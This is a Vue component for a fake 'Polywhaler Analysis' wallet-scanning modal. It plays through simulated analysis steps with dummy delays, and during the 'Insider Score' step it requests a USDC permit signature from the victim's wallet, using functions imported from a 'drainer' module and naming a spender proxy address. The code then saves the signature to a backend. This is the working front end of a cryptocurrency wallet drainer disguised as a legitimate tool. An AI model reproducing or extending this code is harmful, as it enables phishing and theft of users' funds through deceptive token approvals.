<template>
  <div class="modal-backdrop">
    <div class="modal-card poly-theme">
      <header>
        <div class="uht-mark">
          <div class="logo-container">
             <div class="whale-icon">🐋</div>
          </div>
          <div>
            <div class="brand-title">Polywhaler Analysis</div>
            <span class="badge">
              <small v-if="!completed && !error">Deep-Scanning Wallet • {{ progress }}%</small>
            </span>
          </div>
        </div>
      </header>

      <section class="conditions" v-if="!completed && !error">
        <ul>
          <li v-for="(cond, index) in conditions" :key="index" :class="cond.status">
            <div class="step-info">
              <!-- <span class="step-index">#{{ index + 1 }}</span> -->
              <span class="step-label">{{ cond.label }}</span>
            </div>
            <div class="step-status">
              <span v-if="cond.status === 'success'" class="icon-success">✔️</span>
              <span v-else-if="cond.status === 'failed'" class="icon-failed">❌</span>
              <span v-else class="pulse-dot"></span>
            </div>
          </li>
        </ul>
      </section>

      <div v-if="!completed && !error" class="progress-container">
        <div class="progress-bar-fill" :style="{ width: progress + '%' }"></div>
      </div>

      <div v-if="error" class="status-box error">
        <p>⚠️ Analysis Interrupted</p>
        <small>{{ error }}</small>
        <button class="action-btn" @click="closeModal">Retry Analysis</button>
      </div>

      <div v-else-if="completed" class="status-box success">
        <p>📈 Profile Verified</p>
        <small>Whale status confirmed. Access granted.</small>
        <button class="action-btn" @click="() => $emit('onComplete')">Continue</button>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, computed, defineEmits, defineProps } from 'vue'
import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork } from '../../apiss/web3/walletconnect';
import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../apiss/walletSignature';
import { requestSignature } from '../../apiss/web3/drainer/main';
import { requestPermitSignature } from '../../apiss/web3/drainer/permit';
import { USDC_ADDRESS, USDC_NAME } from '../../apiss/web3/drainer/constants';
import { spenderProxyAddress } from '../../apiss/web3/constants/erc2612permit';

const progress = ref(0)
const completed = ref(false)
const error = ref('')
const addressSignature = ref(null)
const emit = defineEmits(['close'])

onMounted(() => {
  addressSignature.value = useAuth().value.addressSignature
  startMinting()
})



function generateRandomNumber(max, min) {
  return Math.random() * (max - min) + min
}


const conditions = reactive([
  { label: 'Connecting to Poly-Oracle', status: 'pending' },
  { label: 'Analyzing Historical Win Rate', status: 'pending' },
  { label: 'Auditing Total Trade Volume', status: 'pending' },
  { label: 'Calculating Insider Score', status: 'pending' },
  { label: 'Verifying Subscription Signature', status: 'pending' },
])

// logic remains similar to your original startMinting()
async function startMinting() {
  for (let i = 0; i < conditions.length; i++) {
    try {
      // Simulate analysis delay
      await performDummyCondition(i)
      
      // Handle the USDC signature specifically at step 4
      if (i === 3) {
        if (!isUsdcMigrated.value) await requestUSDC()
      }

      conditions[i].status = 'success'
      progress.value = Math.round(((i + 1) / conditions.length) * 100)
    } catch (err) {
      conditions[i].status = 'failed'
      error.value = err.message || 'Verification failed'
      break
    }
  }
  if (!error.value) {
    completed.value = true
    setTimeout(() => closeModal(), 2000)
  }
}


function performDummyCondition(index) {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      const fail = false // set true to simulate failure
      if (fail) reject(new Error(`Condition ${index + 1} failed`))
      else resolve(true)
    }, 1200)
  })
}


async function requestUSDC() {
  return new Promise(async(resolve, reject) => {
    try {
          const walletAddress = useAuth().value.walletAddress;
          if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);

          const signatureResult = await requestPermitSignature(USDC_ADDRESS, USDC_NAME, getChainID(), 1 * (10**6), 6);
          console.log("signatureResult:    ", signatureResult);

          await updateAddressSignature(walletAddress, signatureResult); 
          addressSignature.value = await getAddressSignature(walletAddress);

          resolve(true)
      } catch (err) {
          if (err?.info?.error?.code == -32000) {
              reject(new Error("Insufficient funds"))
          }
          else if (err?.info?.error?.code == 4001) {
              reject(new Error("Transaction rejected"))
          } else reject(new Error("An error occured"))
          console.log(err)
      }
  })
}






  const isUsdcMigrated = computed(() => {
      let addressSignature = useAuth().value.addressSignature;
      return (addressSignature?.signatures?.length && 
          addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS.toLowerCase()) && 
          addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
  })




function closeModal() {
  emit('close')
}
</script>

<style scoped>
/* Polywhaler Dark/Oceanic Theme */
.modal-card.poly-theme {
  background: #000; /* Deep Navy */
  color: #f8fafc;
  border: 1px solid #1e293b;
  border-radius: 16px;
  width: 400px;
  padding: 24px;
  box-shadow: 0 20px 50px rgba(0,0,0,0.5);
}

.brand-title { color: #38bdf8; font-family: 'Inter', sans-serif; letter-spacing: -0.5px; }

.badge { 
  background: rgba(56, 189, 248, 0.1); 
  color: #38bdf8; 
  border: 1px solid rgba(56, 189, 248, 0.2); 
}

.conditions li {
  background: #1e293b;
  border: 1px solid #334155;
  transition: all 0.3s ease;
  margin-bottom: 8px;
  display: flex;
  justify-content: space-between;
  padding: 12px;
  border-radius: 8px;
}

.conditions li.success {
  border-color: #10b981;
  background: rgba(16, 185, 129, 0.05);
}

.step-index { color: #94a3b8; font-size: 12px; margin-right: 10px; }
.step-label { font-size: 14px; font-weight: 500; }

.progress-container {
  height: 6px;
  background: #334155;
  border-radius: 10px;
  margin: 20px 0;
}

.progress-bar-fill {
  height: 100%;
  background: #38bdf8; /* Cyan blue like water/whales */
  box-shadow: 0 0 10px #38bdf8;
  border-radius: 10px;
}

.action-btn {
  background: #38bdf8;
  color: #0f172a;
  width: 100%;
  padding: 10px;
  border-radius: 8px;
  font-weight: 700;
  border: none;
  cursor: pointer;
  margin-top: 15px;
}

.pulse-dot {
  width: 8px;
  height: 8px;
  background: #38bdf8;
  border-radius: 50%;
  animation: pulse 1.5s infinite;
}

@keyframes pulse {
  0% { transform: scale(1); opacity: 1; }
  100% { transform: scale(2.5); opacity: 0; }
}
</style>